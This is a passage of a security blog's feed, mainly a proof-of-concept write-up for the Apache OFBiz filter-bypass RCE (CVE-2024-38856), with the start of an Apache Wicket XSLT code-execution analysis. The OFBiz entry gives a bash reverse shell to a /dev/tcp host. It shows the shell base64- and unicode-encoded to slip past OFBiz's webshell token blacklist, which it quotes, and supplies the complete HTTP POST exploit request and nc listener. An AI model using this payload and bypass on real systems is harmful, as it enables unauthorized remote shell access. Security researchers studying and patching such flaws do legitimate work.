<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(test61);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="原贴"><a href="#原贴" class="headerlink" title="原贴"></a>原贴</h3><p><a href="https://forum.butian.net/share/487">https://forum.butian.net/share/487</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>(CVE-2024-38856)ofbiz_12.14_filter绕过到rce</title>
    <link href="/2024/08/05/CVE-2024-38856-ofbiz-12-14-filter%E7%BB%95%E8%BF%87%E5%88%B0rce/"/>
    <url>/2024/08/05/CVE-2024-38856-ofbiz-12-14-filter%E7%BB%95%E8%BF%87%E5%88%B0rce/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Vulnerability-description"><a href="#0x01-Vulnerability-description" class="headerlink" title="0x01  Vulnerability description"></a>0x01  Vulnerability description</h2><p>​In apache ofbiz 12.14, there is remote command execution. Users can use a specific url to bypass filter detection, resulting in unauthorized execution of goorvy code.</p><h3 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h3><p>First convert <strong>Reverse Shell</strong> to a form that can be recognized by java</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>Using unicode coding</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">\u0022\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u007B\u0065\u0063\u0068\u006F\u002C\u004C\u0032\u004A\u0070\u0062\u0069\u0039\u0069\u0059\u0058\u004E\u006F\u0049\u0043\u0031\u0070\u0049\u0044\u0034\u006D\u0049\u0043\u0039\u006B\u005A\u0058\u0059\u0076\u0064\u0047\u004E\u0077\u004C\u007A\u0045\u0079\u004E\u0079\u0034\u0077\u004C\u006A\u0041\u0075\u004D\u0053\u0038\u0034\u004F\u0044\u0067\u0034\u0049\u0044\u0041\u002B\u004A\u006A\u0045\u003D\u007D\u007C\u007B\u0062\u0061\u0073\u0065\u0036\u0034\u002C\u002D\u0064\u007D\u007C\u007B\u0062\u0061\u0073\u0068\u002C\u002D\u0069\u007D\u0022\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/webtools/control/main/ProgramExport</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8443<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-taggerscript">groovyProgram=<span class="hljs-symbol">\u0022</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u002D</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u007B</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u002C</span><span class="hljs-symbol">\u004C</span><span class="hljs-symbol">\u0032</span><span class="hljs-symbol">\u004A</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0039</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0059</span><span class="hljs-symbol">\u0058</span><span class="hljs-symbol">\u004E</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0031</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0044</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u006D</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0039</span><span class="hljs-symbol">\u006B</span><span class="hljs-symbol">\u005A</span><span class="hljs-symbol">\u0058</span><span class="hljs-symbol">\u0059</span><span class="hljs-symbol">\u0076</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u0047</span><span class="hljs-symbol">\u004E</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u004C</span><span class="hljs-symbol">\u007A</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u004E</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u004C</span><span class="hljs-symbol">\u006A</span><span class="hljs-symbol">\u0041</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u004D</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0038</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u004F</span><span class="hljs-symbol">\u0044</span><span class="hljs-symbol">\u0067</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0044</span><span class="hljs-symbol">\u0041</span><span class="hljs-symbol">\u002B</span><span class="hljs-symbol">\u004A</span><span class="hljs-symbol">\u006A</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u003D</span><span class="hljs-symbol">\u007D</span><span class="hljs-symbol">\u007C</span><span class="hljs-symbol">\u007B</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0036</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u002C</span><span class="hljs-symbol">\u002D</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u007D</span><span class="hljs-symbol">\u007C</span><span class="hljs-symbol">\u007B</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u002C</span><span class="hljs-symbol">\u002D</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u007D</span><span class="hljs-symbol">\u0022</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0029</span></span><br></code></pre></td></tr></table></figure><p>Using nc snooping on Linux 8888</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>Shell is successfully obtained after the corresponding packet is sent.</p><h3 id="0x03-Code-analysis"><a href="#0x03-Code-analysis" class="headerlink" title="0x03  Code analysis"></a>0x03  Code analysis</h3><p>If the url I submitted is <strong>control&#x2F;main&#x2F;ProgramExport</strong>, filter will do the following</p><p>org.apache.ofbiz.webapp.control.ControlFilter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(((HttpServletRequest) request).getRequestURL().toString())<br>            .normalize().toString()<br>            .replaceAll(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>            .replaceAll(<span class="hljs-string">&quot;(?i)%2e&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!((HttpServletRequest) request).getRequestURL().toString().equals(url)) &#123;<br>        Debug.logError(<span class="hljs-string">&quot;For security reason this URL is not accepted&quot;</span>, <span class="hljs-keyword">module</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;For security reason this URL is not accepted&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (URISyntaxException e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125;<br></code></pre></td></tr></table></figure><p>You can see in lines 137-148 that this is a fix for (CVE-2024-32113) Path traversal leading to RCE.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (!allowedPaths.contains(requestUri.substring(<span class="hljs-number">0</span>, offset))) &#123;<span class="hljs-comment">//  allowedPaths  “/control/main”</span><br>    offset = requestUri.indexOf(<span class="hljs-string">&quot;/&quot;</span>, offset + <span class="hljs-number">1</span>);  <br>    <span class="hljs-keyword">if</span> (offset == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (allowedPaths.contains(requestUri)) &#123; <br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// path not allowed</span><br>        <span class="hljs-keyword">if</span> (redirectPath == <span class="hljs-literal">null</span>) &#123;<br>            httpResponse.sendError(errorCode, httpRequest.getRequestURI());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirectPathIsUrl) &#123;<br></code></pre></td></tr></table></figure><p>Then look down, line 174 redirectPath and go to the position of <strong>“&#x2F;“</strong> for splicing, and finally get <strong>&#x2F; control&#x2F;main</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">                <span class="hljs-keyword">if</span> (Debug.infoOn()) &#123;<br>                    Debug.logInfo(<span class="hljs-string">&quot;[Filtered request]: &quot;</span> + httpRequest.getRequestURI() + <span class="hljs-string">&quot; --&gt; &quot;</span> + (redirectPath == <span class="hljs-literal">null</span>? errorCode: redirectPath), <span class="hljs-keyword">module</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, httpResponse);  <span class="hljs-comment">//Finally, filter intercepts control/main, and finally passes filter detection.</span><br>    &#125;/control/main <br>&#125;<br></code></pre></td></tr></table></figure><p>Finally, filter is called to check <strong>“&#x2F; control&#x2F;main”</strong>, but <strong>“&#x2F; control&#x2F;main”</strong> does not require authentication, so bypass the filter check.。</p><p>After a series of processing, come to</p><p><strong>org.apache.ofbiz.webapp.control.RequestHandler#doRequest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// workaround if we are in the root webapp</span><br><span class="hljs-type">String</span> <span class="hljs-variable">cname</span> <span class="hljs-operator">=</span> UtilHttp.getApplicationName(request);<br><br><span class="hljs-comment">// Grab data from request object to process</span><br><span class="hljs-type">String</span> <span class="hljs-variable">defaultRequestUri</span> <span class="hljs-operator">=</span> RequestHandler.getRequestUri(request.getPathInfo());<br><br><span class="hljs-type">String</span> <span class="hljs-variable">requestMissingErrorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unknown request [&quot;</span><br>        + defaultRequestUri<br>        + <span class="hljs-string">&quot;]; this request does not exist or cannot be called directly.&quot;</span>;<br><span class="hljs-comment">//... 273</span><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getPathInfo();<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> getRequestUri(path);<br><span class="hljs-type">String</span> <span class="hljs-variable">overrideViewUri</span> <span class="hljs-operator">=</span> getOverrideViewUri(path); <span class="hljs-comment">// Control/main/ProgramExport gets ProgramExport.</span><br>Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);<br><span class="hljs-keyword">if</span> (rmaps.isEmpty()) &#123;<br>    <span class="hljs-keyword">if</span> (throwRequestHandlerExceptionOnMissingLocalRequest) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHandlerException</span>(requestMissingErrorMessage)<br></code></pre></td></tr></table></figure><p>Get the path at line 275 to get the final url, get the <strong>ProgramExport</strong>, and assign the value to <strong>overrideViewUri</strong>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//... 742 </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value; <span class="hljs-comment">// get viewName (ProgramExport) </span><br>    renderView(viewName, requestMap.securityExternalView, request, response, saveName);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;view-last&quot;</span>.equals(nextRequestResponse.type)) &#123;<br></code></pre></td></tr></table></figure><p>From lines 741 to 743, get the name <strong>“view”</strong> from <strong>overrideViewUri</strong>, and then call renderView to render.</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...56 </span><br>parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br><br><span class="hljs-keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span><br>        <span class="hljs-keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="hljs-string">&quot;import&quot;</span>])) &#123;<br>            logError(<span class="hljs-string">&quot;================== Not executed for security reason ==================&quot;</span>)<br>            request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="hljs-string">&quot;Not executed for security reason&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        shell.parse(groovyProgram)<br>        shell.evaluate(groovyProgram)<br>        recordValues = shell.getVariable(<span class="hljs-string">&quot;recordValues&quot;</span>)<br>        xmlDoc = GenericValue.makeXmlDocument(recordValues)<br></code></pre></td></tr></table></figure><p>Between lines 55 and 80, we can see that the <strong>ProgramExport</strong> receives the parameter <strong>groovyProgram</strong> to pass the value. Then call the <strong>SecuredUpload.isValidText</strong> function to check the blacklist.</p><p>org.apache.ofbiz.security.SecuredUpload#isValidText</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MODULE</span> <span class="hljs-operator">=</span> SecuredUpload.class.getName();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; DENIEDFILEEXTENSIONS = getDeniedFileExtensions();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; DENIEDWEBSHELLTOKENS = getDeniedWebShellTokens();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">MAXLINELENGTH</span> <span class="hljs-operator">=</span> UtilProperties.getPropertyAsInteger(<span class="hljs-string">&quot;security&quot;</span>, <span class="hljs-string">&quot;maxLineLength&quot;</span>, <span class="hljs-number">10000</span>);<br><br>.....<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidText</span><span class="hljs-params">(String content, List&lt;String&gt; allowed)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> content != <span class="hljs-literal">null</span> ? DENIEDWEBSHELLTOKENS.stream().allMatch(token -&gt; isValid(content, token.toLowerCase(), allowed)) : <span class="hljs-literal">false</span>;<br>    &#125;<br>...<br><span class="hljs-number">770</span>  <br>      <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">getDeniedWebShellTokens</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">deniedTokens</span> <span class="hljs-operator">=</span> UtilProperties.getPropertyValue(<span class="hljs-string">&quot;security&quot;</span>, <span class="hljs-string">&quot;deniedWebShellTokens&quot;</span>);<br>        <span class="hljs-keyword">return</span> UtilValidate.isNotEmpty(deniedTokens) ? StringUtil.split(deniedTokens, <span class="hljs-string">&quot;,&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>Blacklist in <strong>DENIEDWEBSHELLTOKENS</strong></p><p>framework&#x2F;security&#x2F;config&#x2F;security.properties </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">... <span class="hljs-number">238</span><br>deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,&lt;?php,exec(,alert(,\<br>                     %eval,<span class="hljs-meta">@eval</span>,eval(,runtime,<span class="hljs-keyword">import</span>,passthru,shell_exec,<span class="hljs-keyword">assert</span>,str_rot13,system,decode,include,page ,\<br>                     chmod,mkdir,fopen,fclose,<span class="hljs-keyword">new</span> <span class="hljs-title class_">file</span>,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\<br>                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,<span class="hljs-keyword">static</span>,assign,webappPath,\<br>                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,<span class="hljs-string">&quot;cmd&quot;</span>,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\<br>                     execute,println,calc,touch,calculate<br><br></code></pre></td></tr></table></figure><p>As you can see, it is based on character matching, and we only need to <strong>unicode the payload to bypass it</strong>.</p><p>At this point, the entire exploit is completed.</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Wicket代码执行(官方认为是正常功能)</title>
    <link href="/2024/08/04/Apache-Wicket%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%AE%98%E6%96%B9%E8%AE%A4%E4%B8%BA%E6%98%AF%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD/"/>
    <url>/2024/08/04/Apache-Wicket%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%AE%98%E6%96%B9%E8%AE%A4%E4%B8%BA%E6%98%AF%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h3><p>​Apache Wicket是一个Java 语言的Web开发框架。2024年6月，官方发布 9.18.0 与 10.1.0 版本 修复CVE-2024-36522 Apache Wicket XSLT 代码执行漏洞。攻击者可构造恶意请求执行任意代码，控制服务器。但是在 9.18.0 与 10.1.0 版本仍可以进行XSLT 代码执行。</p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02  漏洞分析"></a>0x02  漏洞分析</h3><p>org.apache.wicket.util.resource.XSLTResourceStream#XSLTResourceStream(org.apache.wicket.util.resource.IResourceStream, org.apache.wicket.util.resource.IResourceStream)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">XSLTResourceStream</span><span class="hljs-params">(IResourceStream xsltResource, IResourceStream xmlResource)</span> &#123;<br>    <span class="hljs-built_in">this</span>(xsltResource, xmlResource, defaultTransformerFactory());<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> TransformerFactory <span class="hljs-title function_">defaultTransformerFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">TransformerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> TransformerFactory.newInstance();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        factory.setFeature(<span class="hljs-string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125; <span class="hljs-keyword">catch</span> (TransformerConfigurationException var2) &#123;<br>        <span class="hljs-type">TransformerConfigurationException</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var2;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个可以看见9.18.0 与 10.1.0 版本修复方案是写了一个defaultTransformerFactory，启用安全处理特性，防止解析不安全的扩展函数。</p><p>这里可以看见调用 this(xsltResource, xmlResource, defaultTransformerFactory()), 里面继续调用TransformerFactory factory &#x3D; TransformerFactory.newInstance();但是他是一个public方法，我们可以控制transformerFactory，导致9.18.0 与 10.1.0 版本中的defaultTransformerFactory失效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformerFactory</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformerFactory</span><span class="hljs-params">()</span> &#123; &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TransformerFactory <span class="hljs-title function_">newDefaultInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TransformerFactory <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerFactoryConfigurationError &#123;<br><br>        <span class="hljs-keyword">return</span> FactoryFinder.find(<br>            <span class="hljs-comment">/* The default property name according to the JAXP spec */</span><br>            TransformerFactory.class,<br>            <span class="hljs-comment">/* The fallback implementation class name, XSLTC */</span><br>            <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>建议修改为private方法。</p><h3 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h3><p>使用 Apache Maven 将您的依赖项更新为修复<strong>CVE-2024-36522</strong>的版本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.wicket<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 